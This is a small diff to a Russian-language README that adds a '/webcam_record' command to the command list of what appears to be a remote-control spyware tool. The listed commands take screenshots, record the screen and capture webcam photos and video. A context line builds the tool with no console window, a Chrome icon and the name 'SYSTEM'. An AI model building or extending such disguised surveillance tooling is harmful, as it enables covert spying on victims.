@@ -79,6 +79,7 @@ pyinstaller --onefile --noconsole --icon=googlechrome.ico --name=SYSTEM main.py
 - `/capture_pc` — Сделать скриншот экрана
 - `/video_pc` — Записать видео с экрана
 - `/capture_webcam` — Сделать фото с веб-камеры
+- `/webcam_record` — Записать видео с веб-камеры
 - `/click_image` — Кликнуть на место, которое на фото 
 - `/wallpaper` — Установить обои на рабочий стол
 
